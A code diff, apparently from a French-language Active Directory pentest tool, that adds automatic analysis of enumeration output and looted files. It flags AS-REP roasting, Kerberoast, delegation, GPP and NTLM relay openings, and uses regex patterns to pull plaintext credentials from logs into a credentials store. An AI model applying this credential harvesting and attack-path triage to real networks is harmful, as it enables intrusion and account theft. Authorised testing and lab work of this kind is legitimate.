@@ -89,6 +89,12 @@ AUTO_ANALYZE_SKIP_SUFFIXES = {
 }
 
 
+# Modes opératoires exposés côté serveur. Le front filtre aussi via ENABLED_OP_MODES
+# (voir index.html). Retirer un mode ici force normalize_cfg à retomber sur le premier.
+ENABLED_OP_MODES = ("htb", "enterprise")
+DEFAULT_OP_MODE = ENABLED_OP_MODES[0] if ENABLED_OP_MODES else "htb"
+
+
 CONFIG_PERSIST_KEYS = (
     "ui_language",
     "target_type",
@@ -108,7 +114,7 @@ def default_config() -> dict:
     return {
         "ui_language": "fr",
         "target_type": "windows",
-        "op_mode": "safe",
+        "op_mode": DEFAULT_OP_MODE,
         "target": "",
         "domain": "",
         "dc": "",
@@ -910,6 +916,22 @@ def collect_discovered_machines(out_dir: Path) -> list[dict]:
                 if not re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", host):
                     add_ip_host(host=host, source=source, info=line[:120])
 
+    loot_analysis_fp = out_dir / "parsed" / "loot_auto_analysis.json"
+    if loot_analysis_fp.exists():
+        try:
+            loot_analysis = json.loads(loot_analysis_fp.read_text())
+            for entry in ((loot_analysis.get("loot_intel") or {}).get("hosts") or []):
+                if not isinstance(entry, dict):
+                    continue
+                add_ip_host(
+                    ip=str(entry.get("ip", "") or "").strip(),
+                    host=str(entry.get("host", "") or "").strip(),
+                    source=str(entry.get("source", "loot_log")),
+                    info=str(entry.get("info", "") or entry.get("evidence", "")).strip()[:160],
+                )
+        except Exception:
+            pass
+
     results = []
     for item in machines.values():
         results.append({
@@ -1067,7 +1089,7 @@ def collect_user_profiles(out_dir: Path) -> list[dict]:
                             flags.append("activé")
                         if uac & 0x10000:
                             flags.append("mot de passe non expirant")
-                        if uac & 0x200000:
+                        if uac & 0x400000:
                             flags.append("compte pré-auth désactivée")
                         if flags:
                             set_meta(name, "uac", ", ".join(flags), allow_trailing_dollar=allow_dollar)
@@ -1297,11 +1319,703 @@ def collect_group_profiles(out_dir: Path) -> list[dict]:
     return result
 
 
+def collect_directory_anomalies(out_dir: Path) -> list[dict]:
+    findings: list[dict] = []
+
+    def add(title: str, path: str = "", severity: str = "medium", why: str = "", impact: str = "", evidence: str = "") -> None:
+        if not title:
+            return
+        entry = {
+            "text": title.strip(),
+            "title": title.strip(),
+            "path": path,
+            "severity": severity,
+            "why": why.strip(),
+            "impact": impact.strip(),
+            "evidence": evidence.strip(),
+        }
+        if entry not in findings:
+            findings.append(entry)
+
+    policy_json = out_dir / "ldapdomaindump" / "domain_policy.json"
+    if policy_json.exists():
+        try:
+            obj = json.loads(policy_json.read_text())
+            attrs = (obj[0].get("attributes", {}) if isinstance(obj, list) and obj else {}) or {}
+            maq = str((attrs.get("ms-DS-MachineAccountQuota") or [None])[0] or "").strip()
+            if maq.isdigit() and int(maq) > 0:
+                add(
+                    f"MachineAccountQuota = {maq}",
+                    "ldapdomaindump/domain_policy.json",
+                    "high",
+                    "Le domaine autorise encore la création de comptes machine par des utilisateurs standards.",
+                    "RBCD, ajout de machine et chemins d'élévation basés sur un faux compte ordinateur deviennent crédibles.",
+                    "ms-DS-MachineAccountQuota > 0",
+                )
+            lockout = str((attrs.get("lockoutThreshold") or [None])[0] or "").strip()
+            if lockout.isdigit() and int(lockout) == 0:
+                add(
+                    "Aucun verrouillage de compte",
+                    "ldapdomaindump/domain_policy.json",
+                    "high",
+                    "La politique de domaine ne semble pas verrouiller les comptes après échecs d'authentification.",
+                    "Password spray et validation de creds nettement moins risqués.",
+                    "lockoutThreshold = 0",
+                )
+        except Exception:
+            pass
+
+    ldap_passpol = out_dir / "ldap_passpol.txt"
+    if ldap_passpol.exists():
+        txt = safe_read_text(ldap_passpol, 12000)
+        min_len = re.search(r"minPwdLength:\s+(\d+)", txt)
+        if min_len and int(min_len.group(1)) < 10:
+            add(
+                f"Longueur minimale des mots de passe = {min_len.group(1)}",
+                "ldap_passpol.txt",
+                "medium",
+                "La politique mot de passe est permissive.",
+                "Le brute force ciblé, le spray ou le crack offline ont plus de chances d'aboutir.",
+            )
+        hist = re.search(r"pwdHistoryLength:\s+(\d+)", txt)
+        if hist and int(hist.group(1)) < 10:
+            add(
+                f"Historique des mots de passe faible ({hist.group(1)})",
+                "ldap_passpol.txt",
+                "low",
+                "Le domaine conserve peu d'anciens mots de passe.",
+                "Les réutilisations et variations de mots de passe deviennent plus plausibles.",
+            )
+        lockout = re.search(r"lockoutThreshold:\s+(\d+)", txt)
+        if lockout and int(lockout.group(1)) == 0:
+            add(
+                "Aucun verrouillage de compte détecté dans la politique LDAP",
+                "ldap_passpol.txt",
+                "high",
+                "Le verrouillage n'est pas activé côté LDAP non plus.",
+                "Le spray mot de passe reste une piste à faible coût opérationnel.",
+            )
+
+    users_json = out_dir / "ldapdomaindump" / "domain_users.json"
+    if users_json.exists():
+        try:
+            users = json.loads(users_json.read_text())
+            counts = {
+                "asrep": 0,
+                "pwd_no_exp": 0,
+                "spn": 0,
+                "admincount": 0,
+                "desc_secret": 0,
+            }
+            desc_hits: list[str] = []
+            for entry in users:
+                attrs = entry.get("attributes", {}) or {}
+                try:
+                    uac = int((attrs.get("userAccountControl") or [0])[0] or 0)
+                except Exception:
+                    uac = 0
+                if uac & 0x400000:
+                    counts["asrep"] += 1
+                if uac & 0x10000:
+                    counts["pwd_no_exp"] += 1
+                if attrs.get("servicePrincipalName"):
+                    counts["spn"] += 1
+                if str((attrs.get("adminCount") or [0])[0]).strip() == "1":
+                    counts["admincount"] += 1
+                desc = str((attrs.get("description") or [""])[0] or "").strip()
+                if desc and re.search(r"(pass(word)?|pwd|secret|credential|creds?)", desc, re.IGNORECASE):
+                    counts["desc_secret"] += 1
+                    sam = str((attrs.get("sAMAccountName") or attrs.get("cn") or ["?"])[0])
+                    desc_hits.append(f"{sam}: {desc[:80]}")
+            if counts["asrep"]:
+                add(
+                    f"{counts['asrep']} compte(s) sans pré-auth Kerberos",
+                    "ldapdomaindump/domain_users.json",
+                    "high",
+                    "Des comptes utilisateurs peuvent demander un AS-REP sans preuve de connaissance du mot de passe.",
+                    "AS-REP roasting possible puis crack offline sans bruit d'authentification interactive.",
+                )
+            if counts["pwd_no_exp"]:
+                add(
+                    f"{counts['pwd_no_exp']} compte(s) avec mot de passe non expirant",
+                    "ldapdomaindump/domain_users.json",
+                    "medium",
+                    "Les secrets de ces comptes risquent d'être stables dans le temps.",
+                    "Un mot de passe récupéré peut rester valable longtemps et servir de pivot durable.",
+                )
+            if counts["spn"]:
+                add(
+                    f"{counts['spn']} compte(s) de service / SPN",
+                    "ldapdomaindump/domain_users.json",
+                    "medium",
+                    "Le domaine expose des comptes de service identifiables.",
+                    "Kerberoast possible avec credentials valides, puis crack offline.",
+                )
+            if counts["admincount"]:
+                add(
+                    f"{counts['admincount']} compte(s) AdminCount=1",
+                    "ldapdomaindump/domain_users.json",
+                    "medium",
+                    "Ces objets sont souvent ou ont été protégés / sensibles.",
+                    "Ils méritent une revue ACL, groupes et chemins d'attaque prioritaires.",
+                )
+            if counts["desc_secret"]:
+                add(
+                    f"{counts['desc_secret']} description(s) utilisateur contiennent des mots-clés secrets/password",
+                    "ldapdomaindump/domain_users.json",
+                    "high",
+                    "Les champs description exposent potentiellement des secrets opérationnels ou indices de mot de passe.",
+                    "Peut donner des creds directs, conventions de mots de passe ou pivots métier.",
+                )
+                for item in desc_hits[:2]:
+                    add(
+                        f"Description sensible",
+                        "ldapdomaindump/domain_users.json",
+                        "high",
+                        "Un contenu de description mérite une revue manuelle immédiate.",
+                        "Potentiel credential leak ou indice de mot de passe.",
+                        item,
+                    )
+        except Exception:
+            pass
+
+    groups_json = out_dir / "ldapdomaindump" / "domain_groups.json"
+    if groups_json.exists():
+        try:
+            groups = json.loads(groups_json.read_text())
+            for entry in groups:
+                attrs = entry.get("attributes", {}) or {}
+                name = str((attrs.get("sAMAccountName") or attrs.get("cn") or [""])[0] or "").strip()
+                members = attrs.get("member") or []
+                if name.lower() in {"domain admins", "enterprise admins", "administrators"} and len(members) > 5:
+                    add(
+                        f"Groupe privilégié '{name}' avec {len(members)} membres",
+                        "ldapdomaindump/domain_groups.json",
+                        "medium",
+                        "Le périmètre d'administration semble large.",
+                        "Davantage de comptes à surveiller, plus de chances de compromission indirecte.",
+                    )
+        except Exception:
+            pass
+
+    computers_json = out_dir / "ldapdomaindump" / "domain_computers.json"
+    if computers_json.exists():
+        try:
+            computers = json.loads(computers_json.read_text())
+            unconstrained = []
+            for entry in computers:
+                attrs = entry.get("attributes", {}) or {}
+                try:
+                    uac = int((attrs.get("userAccountControl") or [0])[0] or 0)
+                except Exception:
+                    uac = 0
+                if uac & 0x80000:
+                    host = str((attrs.get("dNSHostName") or attrs.get("cn") or ["?"])[0] or "?")
+                    unconstrained.append(host)
+            if unconstrained:
+                add(
+                    f"{len(unconstrained)} machine(s) en délégation non contrainte",
+                    "ldapdomaindump/domain_computers.json",
+                    "high",
+                    "Ces hôtes peuvent stocker des tickets réutilisables si l'on y force ou observe une authentification.",
+                    "Capture TGT, élévation et pivot AD très intéressants.",
+                    ", ".join(unconstrained[:3]),
+                )
+        except Exception:
+            pass
+
+    gpp_hits = out_dir / "attack_checks" / "gpp_hits.txt"
+    if gpp_hits.exists():
+        lines = [ln.strip() for ln in safe_read_text(gpp_hits, 8000).splitlines() if ln.strip()]
+        if lines:
+            add(
+                f"GPP / cpassword détecté ({len(lines)} hit(s))",
+                "attack_checks/gpp_hits.txt",
+                "critical",
+                "Des secrets GPP sont exposés dans SYSVOL ou des artefacts liés.",
+                "Peut donner des credentials réutilisables quasi immédiatement.",
+                lines[0][:120],
+            )
+
+    shares_signing = out_dir / "attack_checks" / "smb_signing_check.txt"
+    if shares_signing.exists():
+        txt = safe_read_text(shares_signing, 4000)
+        if re.search(r"signing[:=]\s*false|disabled|not required", txt, re.IGNORECASE):
+            add(
+                "SMB signing non requis",
+                "attack_checks/smb_signing_check.txt",
+                "high",
+                "Les protections anti-relay SMB ne sont pas imposées.",
+                "NTLM relay et certains pivots coercition deviennent beaucoup plus réalistes.",
+            )
+
+    relay_hints = out_dir / "relay_hints" / "ntlm_relay_commands.txt"
+    if relay_hints.exists() and relay_hints.stat().st_size > 0:
+        add(
+            "Des commandes de NTLM relay ont déjà été préparées",
+            "relay_hints/ntlm_relay_commands.txt",
+            "medium",
+            "Le loot a déjà identifié des cibles ou modes de relay plausibles.",
+            "Tu peux passer rapidement de l'énumération à l'abus NTLM relay.",
+        )
+
+    order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
+    findings.sort(key=lambda item: (order.get(item.get("severity", "medium"), 9), item.get("text", "")))
+    return findings[:16]
+
+
+def collect_bloodhound_auto_review(out_dir: Path) -> list[dict]:
+    bh_dir = out_dir / "bloodhound"
+    if not bh_dir.exists():
+        return []
+
+    review: list[dict] = []
+
+    def add(text: str, path: str = "", severity: str = "medium") -> None:
+        if not text:
+            return
+        entry = {"text": text.strip(), "path": path, "severity": severity}
+        if entry not in review:
+            review.append(entry)
+
+    latest_zip = sorted([p for p in bh_dir.glob("*.zip") if p.stat().st_size > 0], key=lambda p: p.stat().st_mtime, reverse=True)
+    users_files = sorted([p for p in bh_dir.glob("*_users.json") if p.stat().st_size > 0], key=lambda p: p.stat().st_mtime, reverse=True)
+    groups_files = sorted([p for p in bh_dir.glob("*_groups.json") if p.stat().st_size > 0], key=lambda p: p.stat().st_mtime, reverse=True)
+    computers_files = sorted([p for p in bh_dir.glob("*_computers.json") if p.stat().st_size > 0], key=lambda p: p.stat().st_mtime, reverse=True)
+    domains_files = sorted([p for p in bh_dir.glob("*_domains.json") if p.stat().st_size > 0], key=lambda p: p.stat().st_mtime, reverse=True)
+
+    if latest_zip:
+        add(f"ZIP BloodHound prêt à l'import : {latest_zip[0].name}.", f"bloodhound/{latest_zip[0].name}", "low")
+
+    if users_files:
+        try:
+            obj = json.loads(users_files[0].read_text())
+            data = obj.get("data", []) or []
+            highvalue = []
+            kerberoast = []
+            asrep = []
+            unconstrained = []
+            admincount = []
+            for entry in data:
+                props = entry.get("Properties", {}) or {}
+                name = (props.get("samaccountname") or props.get("name") or "?").split("@", 1)[0]
+                if props.get("highvalue"):
+                    highvalue.append(name)
+                if props.get("hasspn"):
+                    kerberoast.append(name)
+                if props.get("dontreqpreauth"):
+                    asrep.append(name)
+                if props.get("unconstraineddelegation"):
+                    unconstrained.append(name)
+                if props.get("admincount"):
+                    admincount.append(name)
+            if highvalue:
+                add(f"BloodHound : {len(highvalue)} compte(s) HighValue, ex. {', '.join(highvalue[:4])}.", f"bloodhound/{users_files[0].name}", "high")
+            if kerberoast:
+                add(f"BloodHound : {len(kerberoast)} compte(s) avec SPN / Kerberoast, ex. {', '.join(kerberoast[:4])}.", f"bloodhound/{users_files[0].name}", "medium")
+            if asrep:
+                add(f"BloodHound : {len(asrep)} compte(s) AS-REP roastable, ex. {', '.join(asrep[:4])}.", f"bloodhound/{users_files[0].name}", "high")
+            if unconstrained:
+                add(f"BloodHound : délégation non contrainte sur {', '.join(unconstrained[:3])}.", f"bloodhound/{users_files[0].name}", "high")
+            if admincount:
+                add(f"BloodHound : {len(admincount)} compte(s) AdminCount=1.", f"bloodhound/{users_files[0].name}", "medium")
+        except Exception:
+            pass
+
+    if groups_files:
+        try:
+            obj = json.loads(groups_files[0].read_text())
+            data = obj.get("data", []) or []
+            high_groups = []
+            for entry in data:
+                props = entry.get("Properties", {}) or {}
+                name = (props.get("samaccountname") or props.get("name") or "?").split("@", 1)[0]
+                if props.get("highvalue"):
+                    high_groups.append(name)
+            if high_groups:
+                add(f"BloodHound : groupes HighValue détectés, ex. {', '.join(high_groups[:4])}.", f"bloodhound/{groups_files[0].name}", "high")
+        except Exception:
+            pass
+
+    if computers_files:
+        try:
+            obj = json.loads(computers_files[0].read_text())
+            data = obj.get("data", []) or []
+            unconstrained = []
+            constrained = []
+            for entry in data:
+                props = entry.get("Properties", {}) or {}
+                name = (props.get("samaccountname") or props.get("name") or "?").split("@", 1)[0]
+                if props.get("unconstraineddelegation"):
+                    unconstrained.append(name)
+                if props.get("allowedtodelegate"):
+                    constrained.append(name)
+            if unconstrained:
+                add(f"BloodHound : machines en délégation non contrainte, ex. {', '.join(unconstrained[:4])}.", f"bloodhound/{computers_files[0].name}", "high")
+            if constrained:
+                add(f"BloodHound : délégation contrainte détectée sur {len(constrained)} machine(s).", f"bloodhound/{computers_files[0].name}", "medium")
+        except Exception:
+            pass
+
+    if domains_files:
+        try:
+            obj = json.loads(domains_files[0].read_text())
+            dom = (obj.get("data") or [{}])[0]
+            aces = dom.get("Aces") or []
+            rights = sorted({str(a.get("RightName")) for a in aces if a.get("RightName")})
+            if rights:
+                add(f"BloodHound : droits domaine visibles dans l'export, ex. {', '.join(rights[:5])}.", f"bloodhound/{domains_files[0].name}", "medium")
+        except Exception:
+            pass
+
+    if latest_zip or users_files or groups_files or computers_files or domains_files:
+        add("BloodHound auto-review local terminé. Les shortest paths transverses et chemins multi-sauts nécessitent encore la GUI/Neo4j.", f"bloodhound/{latest_zip[0].name}" if latest_zip else "", "low")
+
+    order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
+    review.sort(key=lambda item: (order.get(item.get("severity", "medium"), 9), item.get("text", "")))
+    return review[:14]
+
+
+def collect_looted_file_review(out_dir: Path) -> list[dict]:
+    downloads_dir = out_dir / "downloads"
+    if not downloads_dir.exists():
+        return []
+
+    findings: list[dict] = []
+    text_suffixes = {
+        ".txt", ".log", ".ini", ".conf", ".config", ".xml", ".json", ".yaml", ".yml",
+        ".ps1", ".bat", ".cmd", ".vbs", ".csv", ".md",
+    }
+    filename_bonus = [
+        (re.compile(r"identity|sync|trace|auth|login|password|secret|token|cred|config|backup", re.I), 18, "Nom de fichier fortement lié à l'authentification, la synchronisation ou les secrets."),
+        (re.compile(r"admin|service|svc|ldap|ad|domain|azure|entra", re.I), 10, "Le nom de fichier évoque l'AD, un compte de service ou un flux d'identité."),
+    ]
+    content_rules = [
+        (re.compile(r"(?i)(password|passwd|pwd)\s*[:=]\s*.+"), 32, "Présence d'une affectation de mot de passe potentiellement en clair."),
+        (re.compile(r"(?i)(token|apikey|api[_-]?key|bearer|secret)\s*[:=]\s*.+"), 28, "Présence potentielle d'un secret applicatif ou jeton."),
+        (re.compile(r"(?i)(user(name)?|login|account|samaccountname|userprincipalname)\s*[:=]\s*.+"), 16, "Présence de noms d'utilisateurs ou d'identifiants métier."),
+        (re.compile(r"\\\\[A-Za-z0-9._$ -]+\\[A-Za-z0-9._$ -]+"), 12, "Présence de chemins UNC ou de références SMB réutilisables."),
+        (re.compile(r"(?i)\b(?:ldap|ldaps|kerberos|sql|mssql|winrm|smb|http|https)://\S+"), 12, "Présence d'URL ou services pouvant ouvrir un nouveau pivot."),
+        (re.compile(r"(?i)\b(?:CN=|OU=|DC=)[^,\r\n]+"), 8, "Présence de DN LDAP ou d'indices AD structurés."),
+        (re.compile(r"(?i)\b[a-z0-9._-]+@[a-z0-9.-]+\.[a-z]{2,}\b"), 10, "Présence d'adresses mail ou d'UPN."),
+    ]
+
+    for fp in sorted(downloads_dir.rglob("*")):
+        try:
+            if not fp.is_file() or fp.stat().st_size <= 0 or fp.stat().st_size > 1024 * 1024:
+                continue
+        except Exception:
+            continue
+        if fp.suffix.lower() not in text_suffixes:
+            continue
+
+        rel = str(fp.relative_to(LOOT_DIR))
+        name = fp.name
+        text = safe_read_text(fp, 20000)
+        if not text.strip():
+            continue
+
+        score = 0
+        reasons: list[str] = []
+        evidence: list[str] = []
+
+        for regex, bonus, why in filename_bonus:
+            if regex.search(name):
+                score += bonus
+                reasons.append(why)
+
+        for regex, bonus, why in content_rules:
+            m = regex.search(text)
+            if m:
+                score += bonus
+                reasons.append(why)
+                snippet = m.group(0).strip()
+                if snippet and snippet not in evidence:
+                    evidence.append(snippet[:140])
+
+        hit_count = len(re.findall(r"(?i)password|passwd|pwd|token|secret|credential|user(name)?|admin|login", text))
+        if hit_count >= 3:
+            score += min(20, hit_count * 2)
+            reasons.append(f"Le contenu contient plusieurs mots-clés sensibles ({hit_count} hits).")
+
+        if score < 18:
+            continue
+
+        if score >= 65:
+            severity = "critical"
+        elif score >= 42:
+            severity = "high"
+        elif score >= 26:
+            severity = "medium"
+        else:
+            severity = "low"
+
+        impact = "Révision manuelle immédiate recommandée."
+        if any("mot de passe" in r.lower() or "secret" in r.lower() for r in reasons):
+            impact = "Peut contenir des credentials réutilisables ou des secrets directement exploitables."
+        elif any("utilisateurs" in r.lower() or "identifiants" in r.lower() for r in reasons):
+            impact = "Peut enrichir l'énumération AD et préparer spray, Kerberoast ou mouvements latéraux."
+        elif any("pivot" in r.lower() or "services" in r.lower() for r in reasons):
+            impact = "Peut révéler un nouveau service, chemin réseau ou flux d'authentification à exploiter."
+
+        findings.append({
+            "title": f"Fichier suspect: {name}",
+            "text": f"{name} (score {score})",
+            "path": rel,
+            "severity": severity,
+            "why": " ".join(dict.fromkeys(reasons))[:400],
+            "impact": impact,
+            "evidence": " | ".join(evidence[:3])[:420],
+            "score": score,
+        })
+
+    order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
+    findings.sort(key=lambda item: (order.get(item.get("severity", "medium"), 9), -int(item.get("score", 0)), item.get("path", "")))
+    return findings[:15]
+
+
+def extract_loot_structured_intel(out_dir: Path) -> dict:
+    downloads_dir = out_dir / "downloads"
+    intel = {
+        "credentials": [],
+        "hosts": [],
+        "findings": [],
+    }
+    if not downloads_dir.exists():
+        return intel
+
+    text_suffixes = {
+        ".txt", ".log", ".ini", ".conf", ".config", ".xml", ".json", ".yaml", ".yml",
+        ".ps1", ".bat", ".cmd", ".vbs", ".csv", ".md",
+    }
+    seen_creds: set[tuple[str, str, str]] = set()
+    seen_hosts: set[str] = set()
+    seen_findings: set[tuple[str, str, str]] = set()
+
+    def add_cred(user: str, password: str = "", note: str = "", path: str = "", evidence: str = "") -> None:
+        user = str(user or "").strip()
+        password = str(password or "").strip()
+        if not user or (not password and not note):
+            return
+        key = (user.lower(), password, path)
+        if key in seen_creds:
+            return
+        seen_creds.add(key)
+        intel["credentials"].append({
+            "user": user,
+            "pass": password,
+            "hash": "",
+            "note": note.strip(),
+            "path": path,
+            "evidence": evidence.strip()[:220],
+            "source": "loot_log",
+        })
+
+    def add_host(host: str, info: str = "", path: str = "", evidence: str = "") -> None:
+        raw = str(host or "").strip().strip(".,;:()[]{}\"'")
+        if not raw:
+            return
+        if re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", raw):
+            key = raw
+        else:
+            raw = raw.lower()
+            if "." not in raw or raw.startswith("_"):
+                return
+            key = raw
+        if key in seen_hosts:
+            return
+        seen_hosts.add(key)
+        intel["hosts"].append({
+            "host": raw if not re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", raw) else "",
+            "ip": raw if re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", raw) else "",
+            "source": "loot_log",
+            "info": info.strip()[:160],
+            "path": path,
+            "evidence": evidence.strip()[:220],
+        })
+
+    def add_finding(title: str, *, path: str = "", severity: str = "medium", why: str = "", impact: str = "", evidence: str = "") -> None:
+        title = str(title or "").strip()
+        if not title:
+            return
+        key = (title, path, evidence[:80])
+        if key in seen_findings:
+            return
+        seen_findings.add(key)
+        intel["findings"].append({
+            "title": title,
+            "text": title,
+            "path": path,
+            "severity": severity,
+            "why": why.strip(),
+            "impact": impact.strip(),
+            "evidence": evidence.strip()[:300],
+            "source": "loot_log",
+        })
+
+    host_pat = re.compile(r"\b(?:[A-Za-z0-9_-]+\.)+[A-Za-z]{2,}\b")
+
+    for fp in sorted(downloads_dir.rglob("*")):
+        try:
+            if not fp.is_file() or fp.stat().st_size <= 0 or fp.stat().st_size > 1024 * 1024:
+                continue
+        except Exception:
+            continue
+        if fp.suffix.lower() not in text_suffixes:
+            continue
+
+        rel = str(fp.relative_to(LOOT_DIR))
+        text = safe_read_text(fp, 40000)
+        if not text.strip():
+            continue
+
+        for match in re.finditer(
+            r'BindUser:\s*"([^"]+)"\s*,\s*BindPass:\s*"([^"]+)"',
+            text,
+            re.IGNORECASE,
+        ):
+            bind_user = match.group(1).strip()
+            bind_pass = match.group(2).strip()
+            user_short = bind_user.split("\\", 1)[-1].split("@", 1)[0]
+            snippet = match.group(0).strip()
+            add_cred(
+                user_short,
+                bind_pass,
+                note=f"Creds exposés dans {fp.name} via BindUser/BindPass",
+                path=rel,
+                evidence=snippet,
+            )
+            add_finding(
+                f"Credentials en clair trouvés dans {fp.name}: {user_short}",
+                path=rel,
+                severity="critical",
+                why="Le log expose directement un compte et son mot de passe en clair.",
+                impact="Réutilisation immédiate possible pour LDAP, SMB, Kerberos, WinRM ou BloodHound.",
+                evidence=snippet,
+            )
+
+        for match in re.finditer(r"Connectivity failed for\s+([^\s.]+)", text, re.IGNORECASE):
+            acct = match.group(1).strip().strip(".")
+            if acct:
+                add_finding(
+                    f"Compte de service observé dans un flux LDAP: {acct}",
+                    path=rel,
+                    severity="medium",
+                    why="Le log montre qu'un compte de service est utilisé pour un bind LDAP applicatif.",
+                    impact="Compte prioritaire à tester ou suivre dans BloodHound/LDAP.",
+                    evidence=match.group(0),
+                )
+
+        for match in re.finditer(r"Establishing SQL session with\s+([A-Za-z0-9._-]+\.[A-Za-z0-9.-]+)", text, re.IGNORECASE):
+            host = match.group(1)
+            add_host(host, info="Serveur SQL mentionné dans un log d'application", path=rel, evidence=match.group(0))
+            add_finding(
+                f"Backend SQL interne identifié: {host}",
+                path=rel,
+                severity="medium",
+                why="Le log décrit une connexion applicative vers un serveur SQL interne.",
+                impact="Pivot potentiel MSSQL, collecte d'info métier et mouvement latéral vers un hôte applicatif.",
+                evidence=match.group(0),
+            )
+
+        for match in re.finditer(r"Validating AD target health:\s+([A-Za-z0-9._-]+\.[A-Za-z0-9.-]+)\s+\(Port\s+(\d+)\)", text, re.IGNORECASE):
+            host = match.group(1)
+            port = match.group(2)
+            add_host(host, info=f"Cible AD/LDAP observée dans un log (port {port})", path=rel, evidence=match.group(0))
+            add_finding(
+                f"Cible AD interne identifiée: {host}:{port}",
+                path=rel,
+                severity="medium",
+                why="Le log confirme le contrôleur ou point LDAP utilisé par le service.",
+                impact="Cible prioritaire pour LDAP, BloodHound et tests de credentials.",
+                evidence=match.group(0),
+            )
+
+        for match in re.finditer(r"\b([A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,})\b", text):
+            email = match.group(1).strip()
+            if email.lower().endswith(".local"):
+                continue
+            add_finding(
+                f"Adresse mail interne observée: {email}",
+                path=rel,
+                severity="low",
+                why="Le log contient une adresse mail interne ou de notification.",
+                impact="Peut enrichir les utilisateurs cibles, conventions de nommage et surfaces applicatives.",
+                evidence=match.group(0),
+            )
+
+        for host in host_pat.findall(text):
+            add_host(host, info=f"Hôte observé dans {fp.name}", path=rel, evidence=host)
+
+    order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
+    intel["findings"].sort(key=lambda item: (order.get(item.get("severity", "medium"), 9), item.get("title", "")))
+    intel["credentials"] = intel["credentials"][:12]
+    intel["hosts"] = intel["hosts"][:24]
+    intel["findings"] = intel["findings"][:18]
+    return intel
+
+
+def merge_auto_creds(out_dir: Path, credentials: list[dict]) -> int:
+    creds_path = out_dir / "creds.json"
+    try:
+        existing = json.loads(creds_path.read_text()) if creds_path.exists() else []
+    except Exception:
+        existing = []
+    existing_keys = {
+        (
+            str(item.get("user", "")).strip().lower(),
+            str(item.get("pass", "")).strip(),
+            str(item.get("hash", "")).strip().lower(),
+        )
+        for item in existing if isinstance(item, dict)
+    }
+    added = 0
+    for cred in credentials or []:
+        if not isinstance(cred, dict):
+            continue
+        key = (
+            str(cred.get("user", "")).strip().lower(),
+            str(cred.get("pass", "")).strip(),
+            str(cred.get("hash", "")).strip().lower(),
+        )
+        if not key[0] or key in existing_keys:
+            continue
+        existing_keys.add(key)
+        new_item = {
+            "id": str(int(time.time() * 1000) + added),
+            "user": str(cred.get("user", "")).strip(),
+            "pass": str(cred.get("pass", "")).strip(),
+            "hash": str(cred.get("hash", "")).strip(),
+            "note": str(cred.get("note", "") or f"Auto-import depuis {cred.get('path', 'loot')}").strip(),
+            "source": str(cred.get("source", "loot_log")).strip(),
+            "path": str(cred.get("path", "")).strip(),
+            "evidence": str(cred.get("evidence", "")).strip()[:220],
+        }
+        existing.append(new_item)
+        added += 1
+    if added:
+        creds_path.write_text(json.dumps(existing, indent=2))
+    return added
+
+
 def collect_detail_sections(out_dir: Path) -> list[dict]:
     sections: list[dict] = []
 
-    def add_section(key: str, title: str, items: list[str]) -> None:
-        cleaned = [it.strip() for it in items if it and it.strip()]
+    def normalize_detail_item(item):
+        if isinstance(item, dict):
+            text = str(item.get("text", "")).strip()
+            if not text:
+                return None
+            normalized = {"text": text}
+            if item.get("path"):
+                normalized["path"] = str(item.get("path")).strip()
+            return normalized
+        text = str(item or "").strip()
+        return {"text": text} if text else None
+
+    def add_section(key: str, title: str, items: list) -> None:
+        cleaned = [normalize_detail_item(it) for it in items]
+        cleaned = [it for it in cleaned if it]
         if cleaned:
             sections.append({"key": key, "title": title, "items": cleaned[:18]})
 
@@ -1565,7 +2279,7 @@ def collect_detail_sections(out_dir: Path) -> list[dict]:
     add_section("delegation", "Délégation & ACL", del_items)
 
     # GPO
-    gpo_items: list[str] = []
+    gpo_items: list[dict] = []
     for rel, label in (
         ("gpo/gpp_candidates.txt", "GPP candidates"),
         ("gpo/logon_scripts.txt", "Scripts de logon"),
@@ -1575,8 +2289,8 @@ def collect_detail_sections(out_dir: Path) -> list[dict]:
         if fp.exists():
             lines = [ln.strip() for ln in safe_read_text(fp, 12000).splitlines() if ln.strip()]
             if lines:
-                gpo_items.append(f"{label}: {len(lines)}")
-                gpo_items.extend(lines[:3])
+                gpo_items.append({"text": f"{label}: {len(lines)}", "path": rel})
+                gpo_items.extend({"text": line, "path": rel} for line in lines[:3])
     add_section("gpo", "GPO / SYSVOL", gpo_items)
 
     # Secretsdump / hash / post-auth
@@ -1615,9 +2329,23 @@ def collect_operational_view(out_dir: Path, domain: str, summary: dict) -> dict:
         "warnings": [],
     }
 
-    def add(bucket: str, item: str) -> None:
-        if item and item not in ops[bucket]:
-            ops[bucket].append(item)
+    def add(bucket: str, item: str | dict, path: str = "") -> None:
+        if isinstance(item, dict):
+            text = str(item.get("text", "")).strip()
+            if not text:
+                return
+            entry = {"text": text}
+            if item.get("path"):
+                entry["path"] = str(item.get("path")).strip()
+        else:
+            text = str(item or "").strip()
+            if not text:
+                return
+            entry = {"text": text}
+            if path:
+                entry["path"] = path.strip()
+        if entry not in ops[bucket]:
+            ops[bucket].append(entry)
 
     def add_decision(title: str, why: str, cmds: list[str] | None = None, score: str = "high") -> None:
         entry = {
@@ -1684,6 +2412,10 @@ def collect_operational_view(out_dir: Path, domain: str, summary: dict) -> dict:
         item = build_operational_command(command, auth_user=auth_user, auth_pass=auth_pass, admin_hash=admin_hash)
         if item["cmd"] and item not in ops["next_commands"]:
             ops["next_commands"].append(item)
+
+    anomaly_items = summary.get("anomalies") or []
+    bh_review_items = summary.get("bloodhound_review") or []
+    loot_hunt_items = summary.get("loot_hunt") or []
 
     # ── SAM / DCSync loot ────────────────────────────────────────────────────
     dcsync_f = out_dir / "attack_checks" / "secretsdump_dcsync.txt"
@@ -1981,6 +2713,12 @@ def collect_operational_view(out_dir: Path, domain: str, summary: dict) -> dict:
         add("current_state", "BloodHound est freiné par le Global Catalog LDAP (3268/3269 inaccessible ou filtré).")
     if bloodhound_partial:
         add("current_state", f"Collecte BloodHound partielle détectée{f' ({bloodhound_mode})' if bloodhound_mode else ''}.")
+    for item in anomaly_items[:2]:
